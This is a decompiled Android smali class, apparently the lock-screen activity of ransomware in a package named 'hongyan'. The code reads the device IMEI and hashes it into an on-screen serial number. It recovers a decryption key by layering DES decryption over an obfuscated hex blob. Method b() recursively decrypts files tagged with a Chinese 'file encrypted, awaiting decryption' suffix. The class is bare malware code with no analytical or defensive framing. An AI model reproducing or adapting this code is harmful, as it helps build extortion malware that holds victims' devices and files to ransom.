.class public Lcom/android/admin/hongyan/lock;
.super Landroid/app/Activity;
.source "lock.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/admin/hongyan/lock$100000000;,
        Lcom/android/admin/hongyan/lock$100000001;,
        Lcom/android/admin/hongyan/lock$100000003;
    }
.end annotation


# instance fields
.field private des:Lcom/android/admin/hongyan/des;

.field fz:Landroid/widget/Button;

.field imei:Ljava/lang/String;

.field jm:Landroid/widget/Button;

.field private key:Ljava/lang/String;

.field lxwm:Landroid/widget/TextView;

.field mm:Landroid/widget/EditText;

.field xlh:Landroid/widget/TextView;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 104
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public b(Ljava/io/File;)V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/File;",
            ")V"
        }
    .end annotation

    .prologue
    .line 89
    move-object v0, p0

    move-object v1, p1

    move-object v8, v1

    invoke-virtual {v8}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v8

    move-object v2, v8

    .line 90
    move-object v8, v2

    if-eqz v8, :cond_0

    .line 92
    move-object v8, v2

    move-object v3, v8

    const/4 v8, 0x0

    move v4, v8

    .line 101
    :goto_0
    move v8, v4

    move-object v9, v3

    array-length v9, v9

    if-lt v8, v9, :cond_1

    :cond_0
    return-void

    .line 92
    :cond_1
    move-object v8, v3

    move v9, v4

    aget-object v8, v8, v9

    move-object v5, v8

    .line 94
    move-object v8, v5

    invoke-virtual {v8}, Ljava/io/File;->isDirectory()Z

    move-result v8

    if-eqz v8, :cond_2

    .line 96
    move-object v8, v0

    move-object v9, v5

    invoke-virtual {v8, v9}, Lcom/android/admin/hongyan/lock;->b(Ljava/io/File;)V

    .line 101
    :goto_1
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 100
    :cond_2
    move-object v8, v5

    invoke-virtual {v8}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v8

    const-string v9, ".\u6587\u4ef6\u5df2\u52a0\u5bc6\u5f85\u89e3\u5bc6"

    invoke-virtual {v8, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    move-object v6, v8

    .line 101
    move-object v8, v0

    iget-object v8, v8, Lcom/android/admin/hongyan/lock;->key:Ljava/lang/String;

    move-object v9, v5

    invoke-virtual {v9}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v9

    move-object v10, v6

    const/4 v11, 0x0

    aget-object v10, v10, v11

    invoke-virtual {v10}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v8, v9, v10}, LXbox/FileEncryptUtils;->decryptFile(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v1, p1

    move-object v5, v0

    invoke-static {v5}, LLogCatBroadcaster;->start(Landroid/content/Context;)V

    .line 24
    move-object v5, v0

    move-object v6, v1

    invoke-super {v5, v6}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 25
    move-object v5, v0

    const/high16 v6, 0x7f030000

    invoke-virtual {v5, v6}, Lcom/android/admin/hongyan/lock;->setContentView(I)V

    .line 26
    move-object v5, v0

    new-instance v6, Lcom/android/admin/hongyan/des;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    const-string v8, "\u7ea2\u989c"

    invoke-direct {v7, v8}, Lcom/android/admin/hongyan/des;-><init>(Ljava/lang/String;)V

    iput-object v6, v5, Lcom/android/admin/hongyan/lock;->des:Lcom/android/admin/hongyan/des;

    .line 29
    move-object v5, v0

    :try_start_0
    new-instance v6, Lcom/android/admin/hongyan/des;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v0

    iget-object v8, v8, Lcom/android/admin/hongyan/lock;->des:Lcom/android/admin/hongyan/des;

    const-string v9, "57e58af4e6039eaf"

    invoke-virtual {v8, v9}, Lcom/android/admin/hongyan/des;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Lcom/android/admin/hongyan/des;-><init>(Ljava/lang/String;)V

    iput-object v6, v5, Lcom/android/admin/hongyan/lock;->des:Lcom/android/admin/hongyan/des;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 36
    :goto_0
    move-object v5, v0

    move-object v6, v0

    :try_start_1
    iget-object v6, v6, Lcom/android/admin/hongyan/lock;->des:Lcom/android/admin/hongyan/des;

    move-object v7, v0

    iget-object v7, v7, Lcom/android/admin/hongyan/lock;->des:Lcom/android/admin/hongyan/des;

    move-object v8, v0

    iget-object v8, v8, Lcom/android/admin/hongyan/lock;->des:Lcom/android/admin/hongyan/des;

    move-object v9, v0

    iget-object v9, v9, Lcom/android/admin/hongyan/lock;->des:Lcom/android/admin/hongyan/des;

    move-object v10, v0

    iget-object v10, v10, Lcom/android/admin/hongyan/lock;->des:Lcom/android/admin/hongyan/des;

    move-object v11, v0

    iget-object v11, v11, Lcom/android/admin/hongyan/lock;->des:Lcom/android/admin/hongyan/des;

    const-string v12, "5a44524f34e26c08398c640c77f189ad51b05c477f9035cc2c3de3fcb0c0b12cd1d253a0ebd13103e6923b9a01f961f8bea139c3ea81694c2f7094be5120bb3052e7e20807a2f94ad9856e69ae4f90ede3d5140d54c3fd6065794f203e54635f9c5f95148919c434a61b1045a49e4713510cf9e5432bb00e1631a5430e605021a85062c82816c986746de5f091c4719ab68db7b7209dd1623bd06139eb40c866f0bf9add6967ac05e95770f8b7717ecd0a9356392768257c377ffe6cd372ffa272143c8092e432dc24f4ff7840ea79bd5866a1bdd32e0ce8726d53d131847c36005798adabfb69bbcf5cd31dd790494901c8ac4502ce05e347e38ef67816ba3744b01c4aab0cc140cf752aca4503ddc9efae2d18b014f29d353bff55071fbd143c498117e67c62d0a21751bfdb0fa699ac270d490c9615fc9c7564b30f417028439f2e671335bec0161344d1a307130c23bd20e14e2bf76f353ceb63b38af9c538d16962cea847bf39397bc3ec6abca2ef4de2f652e7eff551000726cbed705d1b0e55808ab4a6a9abe4cf736c6624c92efaa9a8e702f92297c87086f7b4be7fdfa274758479f34f0ef143eca2c6bdeedc80a0bd67e8a01f21a0d2dd495c57e3d8480df975ffe9a90a105f0b1c78e749778134746d2030f20198751abd7d81c3810680c4dc0dfe60a38a2672f0ab8ade05bada5ae27041f0518ca33176082e1c94b7fe2cd455ddb156c06170c5f86db96d4e1c854a31e23b331407581586e70dc4c2b24ff613d13ae39dccfa4d9e6fde7250e8d172ab30d66ce7ca8ecfa562a53a99774d4eaf1964bb071061546acf4f285af6173373c2d07aa5e0eaed4813feaa6771ad084ad9218b2cd2f2983569662285316779c34b66577e293b5b67625e4567e979b3664d4f4647bd10c7d6e87894ebf6e74bbaa52d6ad00539a5e0c389e1dd584ec29b1a64adedbb526a3f659b3aead900858cb20b5646684aa36071e93e0b5210979f4e3af5643f0c8c93ec05dbd2310938c87ea7fa904f0a104d77e2bfb65b488910e71088ce59728e7a66917d8b5ea63d86aaeb6c9f2b2b1c78f86e3dcf4d8880184cdb49bbe56878907e40948c857724d9ce91f08ea92044b18527d9f6129478ac8ced665099a2c0da4fd7c51bca53ff224b2db994a961cfb6dfe32ba5cdb5cd3e4a15b37db5206a9b2799feaae32961e165e1e25f9164c01a8e9e08f006bc5fc6496f929ab62158b97254501380d55e603fc05c80dc7e62e680710b71480388b62f1fc3623d497af33666877828ec9603f09b4d17d27a3e0b9f16c303a83ebf6407ad236ecf5e9dd04dd4a34d72821763eaedb7c33ae3248c819a163d358bb63cfe76a2f4e369ee37385b4ba015b19b468f063cd1b98607050824518beb70c2a09b934c2362e7e81ef148c995193cbde3e4ccc41912764a13db8f7fc58d9d80c0a71d5a81066bf451653befa47b9d03ae8d770c1b2fd2a07b90c255cab0b960bd5041ee0dcd3655017c127b80d53fa75b2b435012b6d1fc04365e4ff27b47b3a640506a08b9a15388dc7cae6c2f29b01da2392b20ca5de8b7d4eb21df643f5047f9782bc2493281c3d1bcf127d0055f9d7d4ac0c08bd514a3dd45a37d327cd267811675d313ea63bde5e2d57722cdcbc4ee1ad73e535134f4a09722d07185e4ae2e369e11dd89b4def3cbda581358d3e6ddb4463c0766352b3aad96519d377ee2c2a51ec2f042c0c609121335181bc8b7a972a3bfe0d0d62b5ee28134645afc594a4c585523f5833a1e70cb459eb1bf8fc912"

    invoke-virtual {v11, v12}, Lcom/android/admin/hongyan/des;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Lcom/android/admin/hongyan/des;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Lcom/android/admin/hongyan/des;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Lcom/android/admin/hongyan/des;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Lcom/android/admin/hongyan/des;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lcom/android/admin/hongyan/des;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/android/admin/hongyan/lock;->key:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 41
    :goto_1
    move-object v5, v0

    move-object v6, v0

    const/high16 v7, 0x7f060000

    invoke-virtual {v6, v7}, Lcom/android/admin/hongyan/lock;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/TextView;

    iput-object v6, v5, Lcom/android/admin/hongyan/lock;->lxwm:Landroid/widget/TextView;

    .line 42
    move-object v5, v0

    move-object v6, v0

    const v7, 0x7f060001

    invoke-virtual {v6, v7}, Lcom/android/admin/hongyan/lock;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/TextView;

    iput-object v6, v5, Lcom/android/admin/hongyan/lock;->xlh:Landroid/widget/TextView;

    .line 43
    move-object v5, v0

    move-object v6, v0

    const v7, 0x7f060002

    invoke-virtual {v6, v7}, Lcom/android/admin/hongyan/lock;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/Button;

    iput-object v6, v5, Lcom/android/admin/hongyan/lock;->fz:Landroid/widget/Button;

    .line 44
    move-object v5, v0

    move-object v6, v0

    const v7, 0x7f060004

    invoke-virtual {v6, v7}, Lcom/android/admin/hongyan/lock;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/Button;

    iput-object v6, v5, Lcom/android/admin/hongyan/lock;->jm:Landroid/widget/Button;

    .line 45
    move-object v5, v0

    move-object v6, v0

    const v7, 0x7f060003

    invoke-virtual {v6, v7}, Lcom/android/admin/hongyan/lock;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/EditText;

    iput-object v6, v5, Lcom/android/admin/hongyan/lock;->mm:Landroid/widget/EditText;

    .line 46
    move-object v5, v0

    const-string v6, "phone"

    invoke-virtual {v5, v6}, Lcom/android/admin/hongyan/lock;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/telephony/TelephonyManager;

    move-object v2, v5

    .line 47
    move-object v5, v0

    move-object v6, v2

    invoke-virtual {v6}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/android/admin/hongyan/lock;->imei:Ljava/lang/String;

    .line 48
    move-object v5, v0

    iget-object v5, v5, Lcom/android/admin/hongyan/lock;->imei:Ljava/lang/String;

    invoke-static {v5}, Lcom/android/admin/hongyan/红颜一笑尽是伤;->getMD5String(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/android/admin/hongyan/红颜一笑尽是伤;->getsha_1(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object v3, v5

    .line 49
    move-object v5, v0

    iget-object v5, v5, Lcom/android/admin/hongyan/lock;->xlh:Landroid/widget/TextView;

    move-object v6, v3

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 50
    move-object v5, v0

    iget-object v5, v5, Lcom/android/admin/hongyan/lock;->fz:Landroid/widget/Button;

    new-instance v6, Lcom/android/admin/hongyan/lock$100000000;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v0

    move-object v9, v3

    invoke-direct {v7, v8, v9}, Lcom/android/admin/hongyan/lock$100000000;-><init>(Lcom/android/admin/hongyan/lock;Ljava/lang/String;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 59
    move-object v5, v0

    iget-object v5, v5, Lcom/android/admin/hongyan/lock;->lxwm:Landroid/widget/TextView;

    new-instance v6, Lcom/android/admin/hongyan/lock$100000001;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v0

    invoke-direct {v7, v8}, Lcom/android/admin/hongyan/lock$100000001;-><init>(Lcom/android/admin/hongyan/lock;)V

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 67
    move-object v5, v0

    iget-object v5, v5, Lcom/android/admin/hongyan/lock;->jm:Landroid/widget/Button;

    new-instance v6, Lcom/android/admin/hongyan/lock$100000003;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v0

    move-object v9, v3

    invoke-direct {v7, v8, v9}, Lcom/android/admin/hongyan/lock$100000003;-><init>(Lcom/android/admin/hongyan/lock;Ljava/lang/String;)V

    invoke-virtual {v5, v6}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void

    .line 29
    :catch_0
    move-exception v5

    move-object v2, v5

    goto/16 :goto_0

    .line 36
    :catch_1
    move-exception v5

    move-object v2, v5

    goto/16 :goto_1
.end method
